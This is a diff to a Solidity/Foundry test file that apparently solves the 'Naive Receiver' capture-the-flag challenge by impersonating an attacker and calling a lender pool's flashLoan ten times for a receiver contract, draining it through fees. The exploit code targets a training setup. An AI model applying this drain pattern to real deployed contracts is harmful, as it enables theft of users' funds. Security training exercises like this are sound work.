@@ -48,10 +48,16 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1000);
+//            console.log("balance of flashLoanReceiver : ", address(flashLoanReceiver).balance);
+        }
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
